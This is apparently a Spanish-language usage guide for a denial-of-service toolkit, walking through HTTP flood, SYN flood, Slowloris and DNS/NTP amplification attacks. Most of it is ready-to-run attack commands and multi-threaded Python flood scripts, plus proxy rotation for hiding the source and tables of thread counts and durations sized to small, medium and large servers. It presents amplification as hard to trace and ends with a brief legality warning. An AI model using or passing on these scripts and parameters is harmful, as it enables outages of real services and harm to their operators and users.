# Ejemplos de Uso - DoS-Toolkit

Guía completa con ejemplos prácticos para cada tipo de ataque.

## 📋 Tabla de Contenidos

1. [Uso del CLI Principal](#uso-del-cli-principal)
2. [HTTP-Flood](#http-flood)
3. [SYN-Flood](#syn-flood)
4. [Slowloris](#slowloris)
5. [UDP-Amplification](#udp-amplification)
6. [Uso Programático](#uso-programático)

---

## Uso del CLI Principal

### Paso 1: Ejecutar el CLI

```bash
python cli.py
```

### Paso 2: Seleccionar Lenguaje

```
╔════════════════════════════════════════════════════════════════╗
║                    DoS-TOOLKIT v1.0                            ║
║              Multi-Language Denial of Service                  ║
║                                                                ║
║   Python | Go | Rust | C/C++                                   ║
╚════════════════════════════════════════════════════════════════╝

[*] Selecciona el lenguaje de ejecución:

    1. Python
    2. Go
    3. Rust
    4. C/C++
    0. Salir

    [?] Selecciona una opción: 1
```

### Paso 3: Seleccionar Ataque

```
[*] Ataques disponibles en Python:

    1. HTTP-Flood
    2. SYN-Flood
    3. Slowloris
    4. UDP-Amplification
    5. Proxy-Utils
    0. Volver

    [?] Selecciona un ataque: 1
```

### Paso 4: Ingresar Parámetros

```
[*] Configurando HTTP-Flood...

    [?] IP/Dominio objetivo: 192.168.1.1
    [?] Puerto (default 80): 80
    [?] Número de threads (default 100): 50
    [?] Duración en segundos (default 60): 120

[!] ADVERTENCIA: Vas a ejecutar HTTP-Flood contra 192.168.1.1
    ¿Continuar? (s/n): s
```

---

## HTTP-Flood

### Descripción
Envía múltiples solicitudes HTTP GET/POST al objetivo para abrumar el servidor.

### Uso Directo

```bash
# HTTP-Flood básico
python python/attacks.py --attack http_flood --target 192.168.1.1 --port 80 --threads 50 --duration 60

# HTTP-Flood intenso
python python/attacks.py --attack http_flood --target example.com --port 80 --threads 500 --duration 300

# HTTP-Flood contra HTTPS
python python/attacks.py --attack http_flood --target secure.example.com --port 443 --threads 100 --duration 120
```

### Uso Programático (Python)

```python
from python.core.http_flood import HTTPFlood
import threading
import time

# Crear instancia
flood = HTTPFlood('192.168.1.1', 80)

# Enviar solicitud GET
flood.send_request('GET')

# Enviar solicitud POST
flood.send_post_request(data='param1=value1&param2=value2')

# Ataque multi-thread
def attack_worker():
    for i in range(100):
        try:
            flood.send_request()
            print(f"[+] Solicitud {i+1} enviada")
        except Exception as e:
            print(f"[-] Error: {e}")

threads = []
for i in range(10):
    t = threading.Thread(target=attack_worker)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### Parámetros Recomendados

| Objetivo | Threads | Duración | Puerto |
|----------|---------|----------|--------|
| Servidor pequeño | 50-100 | 60-120s | 80 |
| Servidor mediano | 100-300 | 120-300s | 80/443 |
| Servidor grande | 300-1000 | 300-600s | 80/443 |

---

## SYN-Flood

### Descripción
Inunda el objetivo con paquetes SYN malformados para abrumar la tabla de conexiones TCP.

### ⚠️ Requisitos
- Permisos de administrador/root
- Sistema operativo compatible (Linux/Windows con WinPcap)

### Uso Directo

```bash
# SYN-Flood básico (requiere sudo en Linux)
sudo python python/attacks.py --attack syn_flood --target 192.168.1.1 --port 443 --threads 100 --duration 60

# SYN-Flood intenso
sudo python python/attacks.py --attack syn_flood --target 10.0.0.1 --port 80 --threads 500 --duration 300

# SYN-Flood contra múltiples puertos
sudo python python/attacks.py --attack syn_flood --target 192.168.1.1 --port 22 --threads 200 --duration 120
```

### Uso Programático (Python)

```python
from python.core.syn_flood import SYNFlood
import threading

# Crear instancia
syn = SYNFlood('192.168.1.1', 443)

# Enviar paquete SYN (requiere permisos)
try:
    syn.send_syn_packet()
    print("[+] Paquete SYN enviado")
except PermissionError:
    print("[-] Se requieren permisos de administrador")

# Versión simplificada (sin permisos especiales)
syn.send_syn_packet_simple()

# Ataque multi-thread
def syn_attack():
    for i in range(1000):
        try:
            syn.send_syn_packet_simple()
        except Exception as e:
            print(f"[-] Error: {e}")

threads = []
for i in range(50):
    t = threading.Thread(target=syn_attack)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### Parámetros Recomendados

| Objetivo | Threads | Duración | Puerto |
|----------|---------|----------|--------|
| Servidor pequeño | 100-200 | 60-120s | 443 |
| Servidor mediano | 200-500 | 120-300s | 80/443 |
| Servidor grande | 500-2000 | 300-600s | 80/443/22 |

---

## Slowloris

### Descripción
Mantiene conexiones HTTP abiertas indefinidamente, agotando los recursos del servidor.

### Ventajas
- No requiere permisos especiales
- Muy efectivo contra servidores con límite de conexiones
- Bajo consumo de ancho de banda

### Uso Directo

```bash
# Slowloris básico
python python/attacks.py --attack slowloris --target 192.168.1.1 --port 80 --threads 30 --duration 300

# Slowloris intenso
python python/attacks.py --attack slowloris --target example.com --port 8080 --threads 100 --duration 600

# Slowloris contra servidor Apache
python python/attacks.py --attack slowloris --target 10.0.0.1 --port 80 --threads 50 --duration 900
```

### Uso Programático (Python)

```python
from python.core.slowloris import Slowloris
import threading
import time

# Crear instancia
slow = Slowloris('192.168.1.1', 80)

# Enviar solicitud lenta
slow.send_slow_request()

# Mantener múltiples conexiones abiertas
def maintain_connections():
    sockets = []
    try:
        for i in range(50):
            sock = slow.create_connection()
            sockets.append(sock)
            print(f"[+] Conexión {i+1} abierta")
        
        # Mantener conexiones abiertas
        time.sleep(600)  # 10 minutos
        
    finally:
        slow.close_all_connections()

# Ejecutar en thread
t = threading.Thread(target=maintain_connections)
t.start()
t.join()
```

### Parámetros Recomendados

| Objetivo | Threads | Duración | Puerto |
|----------|---------|----------|--------|
| Servidor pequeño | 20-50 | 300-600s | 80 |
| Servidor mediano | 50-100 | 600-1200s | 80/8080 |
| Servidor grande | 100-300 | 1200-3600s | 80/8080/8000 |

---

## UDP-Amplification

### Descripción
Explota servidores DNS/NTP públicos para amplificar tráfico hacia el objetivo.

### Ventajas
- Amplificación de tráfico (10-100x)
- Difícil de rastrear
- Muy efectivo contra objetivos

### ⚠️ Consideraciones
- Requiere acceso a servidores amplificadores
- Puede ser detectado por IDS/IPS
- Uso responsable recomendado

### Uso Directo

```bash
# UDP-Amplification DNS
python python/attacks.py --attack udp_amplification --target 192.168.1.1 --port 53 --threads 200 --duration 120

# UDP-Amplification NTP
python python/attacks.py --attack udp_amplification --target 10.0.0.1 --port 123 --threads 300 --duration 300

# UDP-Amplification intenso
python python/attacks.py --attack udp_amplification --target 192.168.1.100 --port 53 --threads 1000 --duration 600
```

### Uso Programático (Python)

```python
from python.core.udp_amp import UDPAmplification
import threading

# Crear instancia (DNS)
udp_dns = UDPAmplification('192.168.1.1', 53, 'dns')

# Enviar amplificación DNS
udp_dns.send_dns_amplification('example.com')

# Crear instancia (NTP)
udp_ntp = UDPAmplification('192.168.1.1', 123, 'ntp')

# Enviar amplificación NTP
udp_ntp.send_ntp_amplification()

# Ataque multi-thread
def udp_attack():
    for i in range(500):
        try:
            udp_dns.send_amplified_packet()
        except Exception as e:
            print(f"[-] Error: {e}")

threads = []
for i in range(100):
    t = threading.Thread(target=udp_attack)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

### Parámetros Recomendados

| Objetivo | Threads | Duración | Puerto |
|----------|---------|----------|--------|
| Servidor pequeño | 100-300 | 60-120s | 53 |
| Servidor mediano | 300-1000 | 120-300s | 53/123 |
| Servidor grande | 1000-5000 | 300-600s | 53/123 |

---

## Uso Programático

### Ejemplo 1: Ataque Personalizado

```python
#!/usr/bin/env python3
from python.core.http_flood import HTTPFlood
from python.core.utils_proxy import ProxyUtils, UserAgentRotation
import threading
import time

class CustomAttack:
    def __init__(self, target, port, threads, duration):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.flood = HTTPFlood(target, port)
        self.ua_rotation = UserAgentRotation()
        self.start_time = None
        self.packets_sent = 0

    def attack_worker(self, worker_id):
        while time.time() - self.start_time < self.duration:
            try:
                self.flood.send_request()
                self.packets_sent += 1
                if self.packets_sent % 100 == 0:
                    print(f"[+] {self.packets_sent} paquetes enviados")
            except Exception as e:
                print(f"[-] Error en worker {worker_id}: {e}")
                time.sleep(1)

    def run(self):
        print(f"[*] Iniciando ataque contra {self.target}:{self.port}")
        print(f"[*] Threads: {self.threads}, Duración: {self.duration}s")
        
        self.start_time = time.time()
        threads = []
        
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_worker, args=(i,))
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        print(f"[+] Ataque completado. Total: {self.packets_sent} paquetes")

# Uso
if __name__ == '__main__':
    attack = CustomAttack('192.168.1.1', 80, 50, 120)
    attack.run()
```

### Ejemplo 2: Ataque con Rotación de Proxies

```python
#!/usr/bin/env python3
from python.core.http_flood import HTTPFlood
from python.core.utils_proxy import ProxyUtils
import threading

class ProxyAttack:
    def __init__(self, target, port, proxies):
        self.target = target
        self.port = port
        self.proxy_utils = ProxyUtils()
        
        for proxy in proxies:
            self.proxy_utils.add_proxy(proxy)

    def attack_with_proxy(self, worker_id):
        proxy = self.proxy_utils.get_random_proxy()
        print(f"[*] Worker {worker_id} usando proxy: {proxy}")
        
        flood = HTTPFlood(self.target, self.port)
        for i in range(100):
            try:
                flood.send_request()
            except Exception as e:
                print(f"[-] Error: {e}")

    def run(self, threads=10):
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=self.attack_with_proxy, args=(i,))
            thread_list.append(t)
            t.start()
        
        for t in thread_list:
            t.join()

# Uso
if __name__ == '__main__':
    proxies = [
        'http://proxy1.com:8080',
        'http://proxy2.com:8080',
        'http://proxy3.com:8080',
    ]
    
    attack = ProxyAttack('192.168.1.1', 80, proxies)
    attack.run(threads=20)
```

### Ejemplo 3: Monitoreo en Tiempo Real

```python
#!/usr/bin/env python3
from python.core.http_flood import HTTPFlood
import threading
import time

class MonitoredAttack:
    def __init__(self, target, port, threads, duration):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.flood = HTTPFlood(target, port)
        self.packets_sent = 0
        self.lock = threading.Lock()
        self.start_time = None

    def attack_worker(self):
        while time.time() - self.start_time < self.duration:
            try:
                self.flood.send_request()
                with self.lock:
                    self.packets_sent += 1
            except Exception as e:
                time.sleep(0.1)

    def monitor(self):
        last_count = 0
        while time.time() - self.start_time < self.duration:
            time.sleep(5)
            with self.lock:
                current = self.packets_sent
            
            pps = (current - last_count) / 5
            elapsed = time.time() - self.start_time
            remaining = self.duration - elapsed
            
            print(f"[~] {current} paquetes | {pps:.1f} pps | {remaining:.0f}s restantes")
            last_count = current

    def run(self):
        print(f"[*] Iniciando ataque monitorizado")
        self.start_time = time.time()
        
        # Threads de ataque
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_worker)
            threads.append(t)
            t.start()
        
        # Thread de monitoreo
        monitor_thread = threading.Thread(target=self.monitor)
        monitor_thread.start()
        
        # Esperar
        for t in threads:
            t.join()
        monitor_thread.join()
        
        print(f"[+] Ataque completado. Total: {self.packets_sent} paquetes")

# Uso
if __name__ == '__main__':
    attack = MonitoredAttack('192.168.1.1', 80, 50, 120)
    attack.run()
```

---

## 🔐 Mejores Prácticas

1. **Siempre obtener autorización** antes de ejecutar ataques
2. **Usar en laboratorios** o entornos de prueba
3. **Documentar** todos los ataques realizados
4. **Monitorear** el impacto en tiempo real
5. **Tener plan de parada** en caso de emergencia

## ⚠️ Advertencia Final

El uso no autorizado de estas herramientas es **ILEGAL** y puede resultar en:
- Cargos criminales
- Multas significativas
- Encarcelamiento
- Responsabilidad civil

**Usa responsablemente.**
